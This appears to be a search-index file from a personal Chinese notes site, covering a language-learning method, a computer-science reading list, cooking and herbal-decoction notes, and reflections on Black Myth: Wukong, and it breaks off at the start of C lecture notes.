{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Track","text":"<p>\u738b\u57a0 - \u5f53\u7136\u6211\u5728\u626f\u6de1 \u9020\u5c31\u6211\u4eca\u5929\u7684\u7f16\u7a0b\u80fd\u529b\u548c\u6d1e\u5bdf\u529b\u7684\uff0c\u4e0d\u662f\u51e0\u767e\u4e07\u884c\u7684\u5927\u578b\u9879\u76ee\uff0c\u800c\u662f\u5c0f\u5230\u51e0\u884c\uff0c\u51e0\u5341\u884c\u4e4b\u77ed\u7684\u7ec3\u4e60\u3002\u4e0d\u8981\u5c0f\u770b\u4e86\u8fd9\u4e9b\u77ed\u5c0f\u7684\u4ee3\u7801\uff0c\u5b83\u4eec\u5c31\u662f\u7f16\u7a0b\u6700\u7cbe\u9ad3\u7684\u4e1c\u897f\u3002\u53cd\u53cd\u590d\u590d\u7422\u78e8\u8fd9\u4e9b\u77ed\u5c0f\u7684\u4ee3\u7801\uff0c\u4e0d\u65ad\u6539\u8fdb\u548c\u63d0\u70bc\u91cc\u9762\u7684\u7ed3\u6784\uff0c\u78e8\u783a\u81ea\u5df1\u7684\u601d\u7ef4\u3002\u9010\u6e10\u7684\uff0c\u4f60\u7684\u8ba4\u8bc6\u6c34\u5e73\u5c31\u8d85\u8d8a\u4e86\u8fd9\u4e9b\u51e0\u767e\u4e07\u884c\uff0c\u8ba9\u4eba\u5934\u75db\u7684\u9879\u76ee\u3002 </p>"},{"location":"#core","title":"Core","text":"<ul> <li> <p>Input \u2192 Process \u2192 Output</p> <ul> <li> <p>Input:</p> <ul> <li>\u542c\u529b</li> </ul> <p>SST \u9898\u5e93\u8bad\u7ec3\u3001Spotify \u9ad8\u8d28\u91cf\u64ad\u5ba2</p> <ul> <li>\u53e3\u8bed</li> </ul> <p>Firefly \u9898\u5e93\u5237\u9898\uff0c\u5355\u8bcd\u672c\u7ea0\u97f3\uff0c\u591a\u542c\u4fdd\u6301\u610f\u7fa4\u8bed\u611f</p> <ul> <li>\u5199\u4f5c</li> </ul> <p>Anki \u79ef\u6512\u4e0b\u7684\u9605\u8bfb\u77ed\u8bed\u548c\u8bcd\u6c47\u8fdb\u884c\u80cc\u8bf5\u4e0e\u7ea0\u6b63\uff0c\u8fdb\u884c\u8bed\u6cd5\u642d\u914d Anki \u518d\u80cc\u8bf5</p> <ul> <li>\u9605\u8bfb</li> </ul> <p>FireFly\u3001\u65b0\u6982\u5ff5\u9605\u8bfb\u8bfb\u672c\u3001\u9ad8\u8d28\u91cf\u7f8e\u56fd\u9ad8\u4e2d\u751f\u6587\u5b66\u3001\u5386\u53f2 Textbook\uff0cReading Firfly \u9898\u5e93\u7ffb\u8bd1\u7406\u89e3\u523b\u610f\u8bad\u7ec3\uff0cReadPaper \u4ee5\u53ca\u6c89\u6d78\u5f0f\u7ffb\u8bd1\u505a\u5bfc\u5165\u8fdb\u884c\u6bb5\u843d\u7cbe\u7ffb\uff0c\u7b14\u8bb0\u5f55\u5165 Anki \u4e2d\u8fdb\u884c\u6458\u7ed9\u51fa\u76f8\u5173\u5f15\u7528</p> </li> </ul> <ul> <li>Process:<ul> <li>\u505a\u9519\u7684\u9898\u76ee\u53cd\u590d\u5f55\u5165 MD \u9519\u9898\u672c\uff0c\u6253\u5370\u540e\u81ea\u884c\u6279\u6539</li> <li>\u91cd\u590d\uff0cRecursion\uff0c\u5927\u6a21\u5757\u62c6\u89e3\u5c0f\u6a21\u5757\u95ee\u9898\u9010\u4e00\u653b\u7834</li> <li>LLM \u5bf9\u4e8e\u5199\u4f5c\u4e0e\u9605\u8bfb\u8fdb\u884c\u5bfc\u5165\u5206\u6790\uff0c\u7ea0\u6b63\u8bed\u6cd5\u3001\u67e5\u8be2\u77ed\u8bed\u642d\u914d</li> <li>Anki \u6216\u767d\u7eb8\u65e9\u4e0a\u590d\u4e60\u5de9\u56fa\u3001\u665a\u4e0a\u7761\u524d\u8bb0\u5fc6\u590d\u4e60\uff0c\u7b2c\u4e8c\u5929\u518d\u56de\u5230\u539f\u8bed\u5883\u91cd\u7406\u89e3</li> <li>\u542c\u529b Spotify YouTube \u5b9a\u5411\u8bdd\u9898\u63d0\u53d6\u5b57\u5e55\u80cc\u8bf5\u4e0d\u719f\u6089\u7684\u5355\u8bcd\u91cd\u590d\u7406\u89e3\u5f55\u5165 Anki</li> </ul> </li> <li> <p>Output:</p> <ul> <li>\u5199\u4f5c</li> </ul> <p>\u8d39\u66fc\u5b66\u4e60\u6cd5\uff0c\u5c06\u9519\u9898\u672c\u4e0e Processed \u63d0\u70bc\u8fc7\u7684\u5355\u8bcd\u4e0e\u8bcd\u7ec4\u642d\u914d\uff0c\u601d\u8003\u8bb0\u5f55\u4e00\u4e9b\u65e5\u8bb0\u5230 Flomo\uff0c\u8bb0\u5f55\u60f3\u6cd5\u3001\u6280\u672f\u7b14\u8bb0\u81f3 Blog \u4e2d\uff0c\u6a21\u62df\u518d\u6b21\u6559\u4f1a\u522b\u4eba</p> <ul> <li>\u53e3\u8bed</li> </ul> <p>\u6a21\u62df\u8c08\u8bdd\u3001\u6f14\u8bb2\u6cd5\uff0c\u901a\u8fc7\u8bdd\u9898\u5047\u88c5\u81ea\u5df1\u5728\u8bb2\u8ff0\u4e00\u4e2a\u6545\u4e8b\uff0c\u4ece Anki \u4e0e\u7b14\u8bb0\u4e2d\u627e\u51fa\u8bcd\u6c47\u8fdb\u884c\u4e32\u8054\u8f93\u51fa\uff0c\u8fdb\u884c Record \u5f55\u5236\u540e\u56de\u653e\u81ea\u7ea0\u8bed\u901f\u4e0e\u8bed\u6cd5\u7b49\u95ee\u9898</p> </li> </ul> <ul> <li>Tools<ul> <li>\u535a\u5ba2\u9002\u5408\u6587\u79d1\u7c7b\u7684 Abstraction \u518d\u63d0\u70bc\u8f93\u51fa\uff0c\u8fdb\u884c\u6574\u5408\u4fee\u6539</li> <li>Flomo \u9002\u5408\u788e\u7247\u5316 Input \u8fdb\u884c Hash Tag \u6807\u6ce8\u6574\u7406\uff0c\u6d41\u6c34\u8d26\u5f0f\u53cd\u601d</li> <li>Notion \u9002\u5408\u65e5\u6708\u8fdb\u5ea6\u8ba1\u5212\u3001\u9519\u9898\u672c\u7684\u5efa\u7acb\u6253\u5370\u3001\u535a\u5ba2\u7684 Abstraction \u518d\u8f93\u51fa\u3001\u4eba\u751f\u3001\u516c\u53f8\u5927\u9879\u76ee\u8ba1\u5212\u7684\u5efa\u7acb</li> <li>Typora + Docsify + OneDrive \u8bb0\u5f55\u7406\u79d1\u89c4\u6574\u6280\u672f\u7b14\u8bb0\uff0cVisual Studio Code \u63a8\u9001\u81f3 Github</li> </ul> </li> <li>Doing One Thing at a Time</li> <li>Make a Plan \u2192 Recursion, Break in to small peieces.</li> <li>\u53cd\u8106\u5f31\uff1a\u81ea\u5df1\u4e3b\u52a8\u7ed9\u81ea\u5df1\u627e\u5b66\u4e60\u4e0a\u7684\u3001\u5065\u8eab\u4e0a\u7684\u82e6\u5934\u5403</li> </ul> </li> </ul>"},{"location":"#computer-science","title":"Computer Science","text":""},{"location":"#devops","title":"DevOps","text":"<ul> <li>A Practical Guide to Linux, Editors, and Shell</li> </ul>"},{"location":"#network","title":"Network","text":"<ul> <li>\u56fe\u89e3 HTTP</li> <li>Computer Networking: A Top-Down Approach</li> </ul>"},{"location":"#algorithm","title":"Algorithm","text":"<ul> <li>CSE 101</li> <li>Grokking Algorithms</li> </ul>"},{"location":"#design-model","title":"Design Model","text":"<ul> <li>A Philosophy of Software Design</li> <li>Grokking the System Design Interview</li> </ul>"},{"location":"#data-structures","title":"Data Structures","text":"<ul> <li>Discrete Math</li> <li>OI Wiki - Codewar</li> <li>CSE 100 - Review the knowledge of C and C++</li> </ul>"},{"location":"#distributed-systems","title":"Distributed Systems","text":"<ul> <li>MIT 6.004<ul> <li>CSE 140</li> <li>Computer Architecture - zyBooks</li> </ul> </li> <li>MIT 6.824 Distributed Systems</li> <li>MIT 6.S081 Operating System Engineering</li> <li>Computer Systems: A Programmer's Perspective</li> </ul>"},{"location":"#bootcamp","title":"Bootcamp","text":"<ul> <li>The Complete 2023 Web Development Bootcamp</li> <li>100 Days of Code: The Complete Python Pro Bootcamp for 2023</li> </ul>"},{"location":"arts/cook/","title":"\u751f\u6d3b\u5c0f\u8bb0","text":""},{"location":"arts/cook/#consumption","title":"Consumption","text":"<ul> <li>Far East Import &amp; Export \u5bb6\u95e8\u53e3\u6700\u8fd1\u7684\u9999\u6599\u8fdb\u53e3\u8d85\u5e02 + NP \u852c\u83dc\u74dc\u679c</li> </ul> <ul> <li>\u9ea6\u5f53\u52b3\u6c49\u5821\u91cc\u7684\u70b8\u9e21\u6392\u53ef\u4ee5\u4e09\u70b9\u4e94\u5200\u4e00\u4efd\u5355\u70b9\uff0cMcCrispy\u00ae Deluxe \u91cc\u7684\u6700\u591a\u6c41\u4e0d\u8fa3\u3002</li> </ul>"},{"location":"arts/cook/#beverages","title":"Beverages","text":"<ul> <li>\u4e24\u6c64\u52fa\u7684\u5927\u8c46\u9ad8\u538b\u9505\u5341\u5206\u949f + \u69a8\u6c41\u673a 750 ML \u6c34\u80fd\u591f\u505a\u4e24\u676f\u8c46\u6d46\uff0c\u5176\u4ed6\u8c46\u5b50\u5206\u88c5\u5373\u53ef\u3002</li> </ul>"},{"location":"arts/cook/#chinese-medicine","title":"Chinese Medicine","text":"<ul> <li>Central Oriental Foods \u4e2d\u592e\u4e9e\u8d85\u9002\u5408\u4e2d\u836f\u91c7\u8d2d</li> </ul> Herb Grams Herb Grams Herb Grams \u592a\u5b50\u53c2 15 \u67f4\u80e1 15 \u5f53\u5f52 10 \u767d\u672f 15 \u767d\u828d 10 \u9ec4\u82a9 10 \u9648\u76ae 10 \u5143\u80e1 10 \u9ec4\u67cf 10 \u832f\u82d3 10 \u534a\u590f 10 \u539a\u6734 10 \u5c71\u6942 10 \u7099\u7518\u8349 6 \u9999\u9644 10 <p>\u4e2d\u836f\u51b7\u6c34 850 ML \u5148\u6ce1\u534a\u5c0f\u65f6\u7136\u540e\u5927\u706b\u716e\u6cb8\u8f6c\u5c0f\u706b 30 \u5206\u949f\uff0c\u635e\u51fa\u836f\u6e23\u7b2c\u4e00\u6279\u836f\u6db2\u653e\u5bb9\u5668\uff0c\u836f\u6e23\u52a0\u4e00\u6837\u7684\u6c34\u91cd\u590d\u714e\u716e\uff0c\u6700\u7ec8\u5f03\u9664\u836f\u6e23\uff0c\u5c06\u6db2\u4f53\u4e0e\u7b2c\u4e00\u6279\u836f\u6db2\u6df7\u5408\u540e\u5206\u4e24\u4efd\u50a8\u5b58\u4e00\u5929\u5185\u559d\u5b8c\u3002</p>"},{"location":"arts/wukong/","title":"\u897f\u6e38","text":"<p>\u9ed1\u795e\u8bdd\u609f\u7a7a\u6700\u4f4e\u753b\u8d28\u5728 macOS \u4e0a\u6700\u4f4e\u753b\u8d28\u6e38\u73a9\u4e86\u4e09\u5929\u534a\u540e\u5b8c\u6210\u4e86\u6240\u6709\u5267\u60c5\uff0c\u8be6\u60c5\u914d\u7f6e\u65b9\u6cd5\u5728 Wine Guide \u4e00\u6587\u4e2d\uff0c\u5e73\u5e38\u65f6\u95f4\u7528 CrossOver \u505a\u4efb\u4f55\u4e8b\u5b9e\u9645\u4e0a\u90fd\u611f\u89c9\u5f88\u618b\u5c48\uff0c\u56e0\u6b64\u5728\u7ed3\u675f\u6e38\u620f\u540e\u5378\u8f7d\u4e86\u6240\u6709\u865a\u62df\u673a\u914d\u7f6e\uff0c\u91cd\u56de\u73b0\u5b9e\u8e0f\u4e0a\u5c5e\u4e8e\u81ea\u5df1\u7684\u53d6\u7ecf\u4e4b\u8def\u3002\u6e38\u620f\u6d89\u53ca\u7684\u6587\u5316\u548c\u56fe\u9274\u6545\u4e8b\u6700\u4e3a\u5438\u5f15\u4eba\uff0c\u5728\u6b64\u8bb0\u5f55\u4e00\u4e9b\u897f\u6e38\u8bb0\u6587\u5316\u5143\u7d20\u7684\u6458\u6284\u4ee5\u53ca\u89e3\u8bfb\u8d44\u6e90\u3002</p>"},{"location":"arts/wukong/#_2","title":"\u674e\u5353\u543e\u6279\u8bc4\u897f\u6e38\u8bb0","text":"<p>gcores.com \u6709\u5f88\u591a\u4f5c\u8005\u5bf9\u6e38\u620f\u5267\u60c5\u548c\u6587\u5316\u6709\u7740\u6df1\u523b\u89e3\u6790\uff0c\u5176\u4e2d\u770b\u5230\u72fc\u5c0f\u660e\u5440\u7528\u300a\u674e\u5353\u543e\u6279\u8bc4\u897f\u6e38\u8bb0\u300b\u4f5c\u4e3a\u5f15\u5b50\u89e3\u6790\u6bcf\u7ae0\u6e38\u620f\u5267\u60c5\u5f88\u662f\u6709\u8da3\uff0c\u65e5\u540e\u6709\u673a\u4f1a\u770b\u4e00\u4e0b\u6279\u8bc4\u8bb0\uff1a</p> <p>\u5b59\u609f\u7a7a\u8ba4\u4e3a\u597d\u7537\u4e0d\u8ddf\u5973\u6597\uff0c\u4e00\u68d2\u5b50\u6253\u6b7b\u5979\u4eec\u6709\u70b9\u6b3a\u8d1f\u4eba\uff0c\u5c31\u73a9\u5fc3\u53c8\u8d77\uff0c\u53d8\u4e86\u53ea\u9e70\uff0c\u5c06\u4e03\u5973\u8863\u670d\u6089\u6570\u53fc\u8d70\u3002\uff08\u6253\u6b7b\u5c31\u6ca1\u540e\u9762\u8fd9\u4e48\u591a\u4e8b\u4e86\uff0c\u53ef\u89c1\u5b59\u609f\u7a7a\u4e5f\u662f\u4e2a\u60f9\u4e8b\u7684\u4e3b\u3002\uff09\u609f\u7a7a\u8fd4\u56de\u4e0e\u516b\u6212\u3001\u6c99\u50e7\u6c47\u5408\uff0c\u516b\u6212\u542c\u8bf4\u5973\u5996\u7cbe\u5728\u6d17\u6fa1\uff0c\u53e3\u79f0\u8981\u53bb\u6253\u6740\u5996\u7cbe\uff0c\u201c\u6296\u64de\u7cbe\u795e\uff0c\u6b22\u5929\u559c\u5730\u4e3e\u7740\u9489\u94af\uff0c\u62fd\u5f00\u6b65\uff0c\u5f84\u76f4\u8dd1\u5230\u90a3\u91cc\u3002\u201d\u5148\u662f\u51fa\u8a00\u8c03\u620f\uff0c\u53c8\u5316\u4f5c\u9cb6\u9c7c\u7cbe\uff0c\u5f80\u5973\u5996\u7cbe\u817f\u95f4\u4e71\u94bb\u3002\uff08\u53e4\u65e9\u9ec4\u6bb5\u5b50\u624b\u674e\u5353\u543e\u5927\u547c\uff1a\u53d8\u5f97\u5999\u554a\uff0c\u53ef\u60dc\u6ca1\u53d8\u4e2a\u6ce5\u9cc5\u9cdd\u9c7c\u4ec0\u4e48\u7684\u3002\uff09 \u201c\u9ec4\u9cdd\u95e8\u201d\u7591\u4f3c\u6709\u4e9b\u843d\u540e\u4e86\u3002\uff08\u674e\u5353\u543e\u8bf4\uff0c\u516b\u6212\u4ece\u6765\u4eb2\u8fd1\u5973\u8272\u6ca1\u6709\u50cf\u8fd9\u6b21\u8fd9\u6837\u4eab\u53d7\u7684\uff0c\u8fd9\u6b21\u662f\u6709\u70b9\u592a\u5f97\u610f\u5fd8\u5f62\u4e86\u3002\uff09\u4e0d\u602a\u540e\u9762\u8718\u86db\u7cbe\u4eec\u5411\u767e\u76ee\u9b54\u541b\u72b6\u544a\u516b\u6212\u201c\u5978\u9a97\u201d\u5979\u4eec\u3002</p> <p>\u4e03\u5996\u7cbe\u6ca1\u8863\u670d\u7a7f\uff0c\u8d64\u6761\u6761\u56de\u6d1e\uff0c\u4ece\u5510\u50e7\u9762\u524d\u7b11\u563b\u563b\u8dd1\u8fc7\u53bb\u3002\uff08\u674e\u5353\u543e\u7b11\u6279\uff1a\u8fd9\u80af\u5b9a\u662f\u5510\u50e7\u751f\u5e73\u672a\u89c1\u3002\u867d\u8179\u4e2d\u7a7a\u7a7a\u4f46\u662f\u5927\u9971\u773c\u798f\uff0c\u5316\u658b\u8fd9\u4e00\u8d9f\u771f\u662f\u4e0d\u865a\u6b64\u884c\u554a\uff01\uff09\u8981\u6211\u8bf4\uff0c\u8001\u674e\u8fd9\u5c31\u8fc7\u5206\u4e86\uff0c\u4ed6\u6015\u662f\u4ee5\u5c0f\u4eba\u4e4b\u5fc3\u5ea6\u541b\u5b50\u4e4b\u8179\u3002\u51b5\u5510\u50e7\u53c8\u4e0d\u662f\u516b\u6212\uff0c\u5c82\u80fd\u4e34\u6b7b\u800c\u4ecd\u56fe\u8272\u4e4e\uff1f\u4e03\u5996\u7cbe\u5524\u6765\u4e03\u4e2a\u5e72\u513f\u5b50\uff0c\u5206\u522b\u662f\u871c\u8702\uff0c\u8682\u8702\uff0c\u8826\u8702\uff0c\u73ed\u6bdb\uff0c\u725b\u8722\uff0c\u62b9\u8721\uff0c\u873b\u8713\uff0c\u8bf7\u4ed6\u4eec\u5e2e\u5fd9\u62b5\u6321\u8ffd\u5175\uff0c\u81ea\u5df1\u5219\u9003\u53bb\u5e08\u5144\u767e\u773c\u9b54\u541b\u5bb6\u3002\u4e03\u4e2a\u5996\u602a\u7684\u5e72\u513f\u5b50\uff0c\u8fd9\u4e00\u9898\u6750\u6216\u4e5f\u53ef\u5728\u6e38\u620f\u91cc\u5927\u4e66\u7279\u4e66\u3002\u4f46\u201c\u6e38\u79d1\u201d\u53ea\u628a\u4ed6\u4eec\u505a\u6210\u4e86\u7b2c\u56db\u7ae0\u91cc\u7684\u4e00\u5e2e\u6742\u5175\u5c0f\u602a\u3002</p>"},{"location":"arts/wukong/#_3","title":"\u5f71\u795e\u56fe","text":"<p>\u5bf9\u6bcf\u4e2a\u4eba\u7269 Biligame \u90fd\u505a\u4e86\u56fe\u9274\u6536\u5f55\uff0c\u6e38\u620f\u4e2d\u7684\u6545\u4e8b\u63cf\u8ff0\u80fd\u591f\u76f4\u63a5\u5728\u8fd9\u4e0a\u9762\u9605\u8bfb\uff0c\u751a\u81f3\u8fd8\u6709\u6e38\u620f\u539f\u672c\u7684\u53f0\u8bcd\u6458\u6284\uff0c\u8003\u636e\uff0c\u6280\u80fd\u62db\u5f0f\u7b49\u3002</p>"},{"location":"arts/wukong/#_4","title":"\u73a9\u540e\u611f","text":"<p>\u7b2c\u4e00\u7ae0\u7684\u91d1\u6c60\u957f\u8001\u548c\u7b2c\u4e09\u7ae0\u7684\u9ec4\u7709\u5927\u738b\u662f\u5168\u5267\u60c5\u4e2d\u6700\u559c\u6b22\u7684\u90e8\u5206\uff0c\u90a3\u79cd\u81ea\u604b\u548c\u504f\u6267\u7b26\u5408\u9ed1\u795e\u8bdd\u7684\u9ed1\u6697\u8bbe\u5b9a\u7684\u540c\u65f6\u4e5f\u5e26\u7ed9\u4e86\u81ea\u5df1\u5bf9\u4e8e\u9ed1\u6697\u4e09\u89d2\u4eba\u683c\u7684\u518d\u601d\u7d22\uff0c\u5267\u4e2d\u9ec4\u7709\u5927\u738b\u7684\u53f0\u8bcd\uff1a</p>"},{"location":"arts/wukong/#_5","title":"\u9ec4\u7709","text":"<p>\u6211\u5728\u5f88\u591a\u5947\u602a\u7684\u68a6\u91cc\uff0c\u89c1\u8fc7\u4f60\u4eec\uff0c\u4f60\u4eec\u56e0\u7f18\u9645\u4f1a\u8d70\u5230\u4e00\u8d77\uff0c\u6000\u7740\u5404\u4e0d\u76f8\u540c\u7684\u76ee\u7684\u3002</p> <p>\u4f60\uff0c\u6b32\u6210\u524d\u4eba\u672a\u7adf\u4e4b\u4e1a\uff0c\u4fee\u529f\u5fb7\u5706\u6ee1\u3002</p> <p>\u4f60\uff0c\u6267\u7740\u540e\u4e16\u4f20\u9882\u4e4b\u540d\uff0c\u6c42\u4f4d\u5217\u4ed9\u73ed\u3002</p> <p>\u4f60\uff0c\u60f3\u8df3\u51fa\u4e09\u754c\u4e4b\u5916\uff0c\u56fe\u4e2a\u6e05\u51c0\u81ea\u5728\u3002</p> <p>\u8fd8\u6709\u4f60\uff0c\u65e0\u6240\u6302\u788d\uff0c\u5403\u987f\u9971\u996d\u4fbf\u5584\u54c9\u5584\u54c9\u3002</p> <p>\u53ef\u6211\uff0c\u65e9\u5c31\u770b\u7a7f\u4e86\u4f60\u4eec\uff0c\u6ee1\u5634\u7684\u60c5\u6000\u5927\u4e49\uff0c\u4e00\u5fc3\u7684\u4e16\u4fd7\u540d\u5229\uff0c\u5531\u4ec0\u4e48\u547d\u4e0d\u7531\u5929\uff0c\u5374\u7b03\u4fe1\u81ea\u5df1\uff0c\u624d\u662f\u5929\u547d\u4e4b\u9009\u3002</p> <p>\u53ef\u60b2\u7684\u53d6\u7ecf\u4eba\u5450\uff0c\u53ea\u8981\u5fc3\u4e2d\u8fd8\u6709\u653e\u4e0d\u4e0b\u7684\u5076\u50cf\uff0c\u7ec8\u6709\u4e00\u5929\uff0c\u5b83\u5c06\u5316\u4e3a\u4fee\u884c\u8def\u4e0a\u65e0\u89e3\u7684\u4e1a\u969c\u3002</p> <p>\u9ec4\u7709\u5927\u738b\u7684\u8bdd\u771f\u5047\u53c2\u534a\uff0c\u548c\u73b0\u5b9e\u751f\u6d3b\u4e2d\u7684\u81ea\u604b\u8005\u4e00\u6837\u5c06\u4eba\u7684\u672c\u6211\u6df1\u523b\u89e3\u6790\uff0c\u89c9\u5f97\u4f17\u4eba\u7686\u9189\u6211\u72ec\u9192\uff0c\u559c\u6b22\u5e26\u7740\u4eba\u6027\u672c\u6076\u7684\u679c\u53bb\u8bc1\u660e\u56e0\u3002\u548c\u7ae0\u8282\u7ed3\u675f\u540e\u7684\u52a8\u753b\u4e00\u6837\uff0c\u4e00\u65e6\u6709\u4e00\u4e2a\u4eba\u6f0f\u51fa\u6076\u5ff5\uff0c\u4ed6\u5c31\u63a8\u7ffb\u6240\u6709\u66fe\u7ecf\u62e5\u6709\u8fc7\u7684\u7f8e\u597d\u8fc7\u7a0b\uff0c\u5927\u7b11\u91d1\u8749\u5b50\u8bf4\u81ea\u5df1\u53c8\u8d62\u4e86\uff0c\u91d1\u8749\u5b50\u53ea\u662f\u7b11\uff1a\u5e08\u5144\u5982\u6b64\u6267\u7740\u8f93\u8d62\uff0c\u53ef\u7b11\uff0c\u53ef\u60b2</p> <p>\u8fd8\u8bb0\u5f97\u76c2\u5170\u4f1a\u4e0a</p> <p>\u4e16\u5c0a\u8bf4\u8fc7\uff1a\u4f17\u751f\u4e4b\u82e6\uff0c\u591a\u56e0\u4e0d\u5b88\u6212\u5f8b\uff0c\u653e\u60c5\u7eb5\u6b32\u3002</p> <p>\u8981\u6211\u8bf4\uff0c\u653e\u5c41\uff01</p> <p>\u4e0d\u6740\u751f\uff0c\u4ec7\u6068\u6c38\u65e0\u6b62\u606f\uff1b</p> <p>\u4e0d\u5077\u76d7\uff0c\u5f3a\u5f31\u5982\u6211\u4f55\u5f02\uff1b</p> <p>\u4e0d\u90aa\u6deb\uff0c\u4e00\u5207\u6709\u60c5\u7686\u5b7d\uff1b</p> <p>\u4e0d\u5984\u8bed\uff0c\u68a6\u5e7b\u6ce1\u5f71\u7a7a\u865a\uff1b</p> <p>\u4e0d\u998b\u9152\uff0c\u5fe7\u6016\u6da8\u843d\u65e0\u5e38\uff1b</p> <p>\u4e0d\u803d\u4e50\uff0c\u82b3\u534e\u5239\u90a3\u800c\u5df2\uff1b</p> <p>\u4e0d\u8d2a\u7720\uff0c\u82e6\u82e6\u4e0d\u5f97\u89e3\u8131\uff1b</p> <p>\u4e0d\u7eb5\u6b32\uff0c\u8bf8\u884c\u4e86\u65e0\u751f\u8da3</p> <p>\u9ec4\u7709\u5927\u738b\u8fd8\u672a\u5f00\u5ead\u5c31\u5df2\u7ecf\u7ed9\u4e16\u4eba\u5b9a\u7f6a\uff1a</p> <p>\u4e16\u4eba\u7686\u6709\u7f6a\uff0c\u7136\u540e\u5728\u6b64\u57fa\u7840\u4e0a\u50cf\u5ba1\u8baf\u72af\u4eba\u4e00\u6837\u5ba1\u5224\u4f17\u751f\u3002</p> <p>\u4fe1\u4ec0\u4e48\u72d7\u5c41\u5982\u6765\uff0c\u4e0d\u5982\u6211\u81ea\u5df1\u6765\uff01</p> <p>\u5728\u6e38\u620f\u4e2d\u4ed6\u5efa\u7acb\u4e86\u5c0f\u96f7\u97f3\u5bfa\u5927\u96c4\u5b9d\u6bbf\uff0c\u548c\u4e3b\u4eba\u5f25\u52d2\u4f5b\u7684\u5927\u96f7\u97f3\u5bfa\u76f8\u547c\u5e94\uff0c\u626e\u6210\u5f25\u52d2\u7684\u6a21\u6837\u9a97\u53d6\u5927\u91cf\u7684\u671d\u5723\u8005\u548c\u795e\u4f5b\u8fdb\u5bfa\uff0c\u7136\u540e\u7528\u5f25\u52d2\u7684\u540e\u5929\u888b\u88c5\u8fdb\u53bb\u70bc\u5316\u6210\u81ea\u5df1\u7684\u9b54\u5316\u5e72\u5c06\u4e3a\u4ed6\u81ea\u5df1\u800c\u6218\u3002</p> <p>\u6211...\u65e9\u5c31\u770b\u7a7f\u4e86\u4f60\u7684\u4e0b\u573a\uff0c\u53ea\u8981\u4f60\u8fd8\u5728\u4e3a\u4ed6\u4eba\u800c\u6218\uff0c\u5c31\u8fdf\u65e9\u4f1a\u6b7b\u5728\u4ed6\u4eba\u624b\u4e0a\uff0c\u6211\u9ec4\u7709\u53ea\u4e3a\u81ea\u5df1\uff01\u6211\u6ca1\u8f93\uff0c\u6211\u4e0d\u4f1a\u8f93...\u53ea\u8981\uff0c\u53ea\u8981\u518d\u7528\u4e00\u6b21\u90a3\u7334\u5b50\u7684\u5b9d\u8d1d...</p> <p>\u5373\u4f7f\u6218\u8d25\u4ed6\u4e5f\u8ba4\u4e3a\u6211\u547d\u7531\u6211\u4e0d\u7531\u5929\uff0c\u8fd8\u60f3\u518d\u8eab\u4efd\u76d7\u7a83\u4e00\u6b21\u5176\u4ed6\u4f5b\u7684\u6cd5\u5b9d\u7136\u540e\u7ee7\u7eed\u4f5c\u6218\u3002\u771f\u7684\u5f25\u52d2\u4f5b\u51fa\u73b0\u540e\u89e3\u91ca\u9053\uff1a</p> <p>\u4ed6\u539f\u672c\u662f\u4e1c\u6765\u4f5b\u7956\u5f25\u52d2\u4f5b\u9762\u524d\u53f8\u78ec\u7684\u4e00\u4e2a\u9ec4\u7709\u7ae5\u5b50\uff0c\u8d81\u5f25\u52d2\u4f5b\u4e0d\u5728\u5bab\u91cc\u5077\u4e86\u51e0\u4ef6\u5b9d\u8d1d\uff0c\u5728\u5c0f\u897f\u5929\u5047\u4f5b\u6210\u7cbe\u3002</p> <p>\u800c\u6e38\u620f\u4e2d\u5df2\u662f\u7b2c\u4e8c\u6b21\u76d7\u53d6\u4ed6\u7684\u540e\u5929\u888b\uff0c\u5728\u501f\u5927\u5723\u4e4b\u529b\u628a\u888b\u5b50\u70bc\u6210\u4e86\u9500\u9b42\u593a\u9b44\u7684\u90aa\u5b9d\uff0c\u7136\u540e\u5316\u4f5c\u5f25\u52d2\u4f5b\u7684\u6a21\u6837\u501f\u673a\u62a5\u590d\u5f53\u5e74\u6536\u590d\u4ed6\u7684\u4ec7\u4eba</p> <p>\u8be5\u4eba\u7269\u548c\u4f4e\u529f\u80fd NPD \u4e00\u6837\u5584\u4e8e PUA \u548c\u8a00\u8bed\u64cd\u7eb5\uff0c\u5229\u7528\u6ed1\u5761\u8c2c\u8bef\u548c\u7834\u7a97\u6548\u5e94\u5047\u88c5\u5f3a\u5927\u5b9e\u9645\u5f31\u5c0f\u7684\u81ea\u5df1\uff0c\u538c\u6076\u4e16\u4eba\u7684\u672c\u6211\u4f46\u81ea\u5df1\u8eab\u4e0a\u7684\u672c\u6211\u5374\u4f53\u73b0\u7684\u73b2\u79bb\u5c3d\u81f4</p>"},{"location":"arts/wukong/#_6","title":"\u91d1\u6c60\u957f\u8001","text":"<p>\u4e3a\u4e86\u51e0\u4ef6\u8863\u670d\u5c06\u9ec4\u7709\u63d0\u51fa\u7684\u5bf9\u5916\u7269\u7684\u6267\u5ff5\u53d1\u6325\u5230\u4e86\u6781\u81f4\u3002</p> <p>\u6839\u636e\u52a8\u753b\u9ed1\u98ce\u5c71\u91d1\u6c60\u957f\u8001\u5728\u6210\u957f\u8fc7\u7a0b\u4e2d\u8ba4\u8bc6\u4e86\u9ed1\u718a\u7cbe\uff0c\u9ed1\u718a\u7cbe\u5e76\u6ca1\u6709\u6740\u5bb3\u4ed6\u3002</p> <p>\u5728\u539f\u8457\u4e2d\u9ed1\u718a\u7cbe\u4e3b\u52a8\u5b66\u4e60\u4f5b\u6cd5\u6700\u540e\u611f\u52a8\u4e86\u83e9\u8428\u505a\u4e86\u5b88\u5c71\u5927\u795e\uff0c\u6709\u4eba\u731c\u60f3\u662f\u4ed6\u4f20\u6388\u4e86\u91d1\u6c60\u957f\u8001\u957f\u751f\u4e0d\u8001\u4e4b\u672f\uff0c\u4e8e\u662f\u5c31\u6709\u4e86\u8fd9\u53e5\u53f0\u8bcd\uff1a</p> <p>\u6211\u4eca\u5e74\u4e8c\u767e\u4e03\u5341\u5c81\uff0c\u7a7a\u6323\u4e86\u51e0\u767e\u4ef6\u8888\u88df\uff0c\u600e\u4e48\u5f97\u6709\u4ed6\u8fd9\u4e00\u4ef6\uff1f</p> <p>\u5176\u4ed6\u9ed1\u98ce\u5c71\u5168\u5267\u60c5\u53ef\u53c2\u8003 B \u7ad9\u535a\u4e3b\u5ddd\u540c\u5b66\u4e0d\u7a7f\u7ae5\u978b\u89e3\u6790</p>"},{"location":"cs/c/2.1/","title":"2.1 Basic Syntax","text":""},{"location":"cs/c/2.1/#mon-lecture","title":"Mon Lecture","text":"<pre><code>#include &lt;stdio.h&gt;\n#include 